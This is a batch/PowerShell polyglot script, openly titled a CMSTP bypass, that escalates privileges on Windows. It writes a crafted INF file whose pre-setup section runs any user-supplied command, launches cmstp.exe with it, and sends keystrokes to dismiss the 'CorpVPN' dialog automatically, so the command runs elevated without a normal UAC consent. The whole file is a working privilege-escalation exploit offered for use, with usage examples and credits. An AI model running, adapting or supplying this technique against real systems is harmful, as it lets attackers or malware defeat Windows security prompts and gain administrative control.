@(set "0=%~f0"^)#) & powershell -nop -c "iex([io.file]::ReadAllText($env:0)); cmstpBypass -command '%*'" & exit /b


#	CMSTP Bypass Script

#	Usage:
#	This script bypasses CMSTP (Connection Manager Profile Installer) by injecting custom commands into an INF file.
#	Example usage:
#
#	.\UACbypasses.bat cmd.exe /c powershell
#	.\UACbypasses.bat -CommandToRun 'echo Hello, World!'
#	.\UACbypasses.bat cmd.exe /c "C:\Users\Administrator\Desktop\Aurora.cmd"

#	Credits:
#	https://github.com/tehstoni/RustyKeys
#	https://github.com/zoicware/zScripts/blob/main/cmstpBypass.bat


function cmstpBypass{
param(
    [string]$command
)

$infFile = @"
[version]
Signature=`$chicago$
AdvancedINF=2.5

[DefaultInstall]
CustomDestination=CustInstDestSectionAllUsers
RunPreSetupCommands=RunPreSetupCommandsSection

[RunPreSetupCommandsSection]
$command
taskkill /IM cmstp.exe /F

[CustInstDestSectionAllUsers]
49000,49001=AllUSer_LDIDSection, 7

[AllUSer_LDIDSection]
"HKLM", "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\CMMGR32.EXE", "ProfileInstallPath", "%UnexpectedError%", ""

[Strings]
ServiceName="CorpVPN"
ShortSvcName="CorpVPN"
"@

$cmstp = 'C:\windows\system32\cmstp.exe'
$fileName = New-Guid
$infFilePath = New-Item "$env:TEMP\$fileName.inf" -Value $infFile -Force 

if(Test-Path $cmstp){
Start-Process -FilePath $cmstp -ArgumentList "/au `"$($infFilePath.FullName)`""
$wshell = New-Object -ComObject wscript.shell
#hit ok on the window 
$running = $true
do {
  $openWindows = Get-Process | Where-Object { $_.MainWindowTitle -ne '' } | Select-Object MainWindowTitle
  foreach ($window in $openWindows) {
    if ($window.MainWindowTitle -eq 'CorpVPN') {
      $wshell.SendKeys('~')
      $running = $false
    }
  }
}while ($running)

}else{
    Write-Error "CMSTP.exe Doesnt Exist at $cmstp"
}
}

